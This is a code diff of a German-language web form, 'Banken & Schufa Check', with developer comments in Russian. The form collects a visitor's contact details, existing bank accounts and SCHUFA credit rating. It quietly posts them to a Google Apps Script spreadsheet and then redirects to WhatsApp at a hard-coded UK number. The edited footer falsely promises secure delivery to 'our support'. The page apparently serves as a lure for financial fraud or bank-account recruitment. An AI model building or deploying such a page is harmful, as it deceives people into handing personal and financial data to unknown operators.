@@ -5,52 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banken & Schufa Check</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #121212;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .quiz-container {
-            background-color: #1e1e1e;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-        }
-        h2 { color: #00ff88; margin-bottom: 25px; font-size: 24px; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .quiz-container { background-color: #1e1e1e; padding: 30px; border-radius: 15px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #00ff88; margin-bottom: 25px; }
         .question { margin-bottom: 20px; text-align: left; }
-        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
-        select, input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            background-color: #2d2d2d;
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-        }
-        select:focus, input:focus { border-color: #00ff88; }
-        .btn {
-            background-color: #25d366;
-            color: white;
-            padding: 15px 25px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            width: 100%;
-            margin-top: 10px;
-            transition: background 0.3s;
-        }
+        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
+        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #2d2d2d; color: white; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #00ff88; }
+        .btn { background-color: #25d366; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; font-size: 16px; transition: 0.3s; }
         .btn:hover { background-color: #1da851; }
         .btn:disabled { background-color: #555; cursor: not-allowed; }
         .footer-text { font-size: 12px; color: #666; margin-top: 15px; }
@@ -67,7 +29,7 @@
     </div>
 
     <div class="question">
-        <label>Haben Sie bereits Konten bei anderen Banken eröffnet?</label>
+        <label>Haben Sie bereits Konten bei anderen Banken?</label>
         <input type="text" id="banks" placeholder="Z.B. Revolut, N26, keine...">
     </div>
 
@@ -77,29 +39,26 @@
             <option value="Gut">Gut (Positiv)</option>
             <option value="Mittelmäßig">Mittelmäßig</option>
             <option value="Schlecht">Schlecht (Negativ)</option>
-            <option value="Weiß nicht">Ich weiß nicht</option>
+            <option value="Weiß nicht">Weiß nicht</option>
         </select>
     </div>
 
-    <button class="btn" id="submitBtn" onclick="sendData(event)">Per WhatsApp senden</button>
-    
-    <p class="footer-text">Klicken Sie auf den Button, um die Daten zu senden.</p>
+    <button class="btn" id="submitBtn" onclick="sendData()">Per WhatsApp senden</button>
+    <p class="footer-text">Ihre Daten werden sicher an unseren Support gesendet.</p>
 </div>
 
 <script>
-    function sendData(e) {
-        e.preventDefault();
-        
+    async function sendData() {
         const btn = document.getElementById('submitBtn');
-        // Твоя НОВАЯ ссылка развертывания
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyI46V_2amvrZE-LdoYzBDk8-CXxAQXVKh6L0Wjxr41aUXEEB91zJtfRimGbqs6plDR3g/exec';
-        
         const contact = document.getElementById('user_contact').value.trim();
         const banks = document.getElementById('banks').value.trim() || "Keine Angabe";
         const schufa = document.getElementById('schufa').value;
+        
+        // Твоя новая ссылка развертывания
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwGSxxrejaA4FoXIAzRMyEZ_TMwdAOweg3SaQjEBALfU5pcMYncFLggYtXL4j3k9O39kA/exec'; 
         const myPhoneNumber = "447474761895"; // <--- ЗАМЕНИ НА СВОЙ НОМЕР БЕЗ ПЛЮСА
 
-        if(!contact) {
+        if (!contact) {
             alert("Bitte geben Sie Ihren Namen oder Ihre Telefonnummer ein.");
             return;
         }
@@ -107,37 +66,34 @@
         btn.disabled = true;
         btn.innerText = "Laden...";
 
-        // 1. Отправка данных в Google Таблицу
-        fetch(scriptURL, { 
-            method: 'POST', 
-            mode: 'no-cors', 
-            body: new URLSearchParams({ 
-                'contact': contact, 
-                'banks': banks, 
-                'schufa': schufa 
-            })
-        })
-        .then(() => {
-            // 2. Формирование сообщения и переход в WhatsApp
-            const message = `Hallo! Ich habe das Formular ausgefüllt.%0A%0A` +
-                            `*Meine Details:*%0A` +
-                            `• Name/Tel: ${contact}%0A` +
-                            `• Banken: ${banks}%0A` +
-                            `• SCHUFA: ${schufa}`;
+        // Формируем сообщение для WhatsApp заранее
+        const message = `Hallo! Ich habe das Formular ausgefüllt.%0A%0A` +
+                        `*Details:*%0A` +
+                        `• Name/Kontakt: ${contact}%0A` +
+                        `• Banken: ${banks}%0A` +
+                        `• SCHUFA: ${schufa}`;
 
-            const whatsappUrl = `https://wa.me/${myPhoneNumber}?text=${message}`;
+        const whatsappUrl = `https://wa.me/${myPhoneNumber}?text=${message}`;
+
+        try {
+            // 1. Отправка в Google Таблицу
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: new URLSearchParams({
+                    'contact': contact,
+                    'banks': banks,
+                    'schufa': schufa
+                })
+            });
             
-            window.open(whatsappUrl, '_blank');
-            
-            btn.disabled = false;
-            btn.innerText = "Per WhatsApp senden";
-        })
-        .catch(error => {
-            console.error('Ошибка!', error.message);
-            alert('Сбой при отправке. Попробуйте еще раз.');
-            btn.disabled = false;
-            btn.innerText = "Per WhatsApp senden";
-        });
+            // 2. Переход в WhatsApp
+            window.location.href = whatsappUrl;
+        } catch (e) {
+            console.error('Fehler:', e);
+            // Если таблица не ответит, всё равно переходим в WhatsApp
+            window.location.href = whatsappUrl;
+        }
     }
 </script>
 
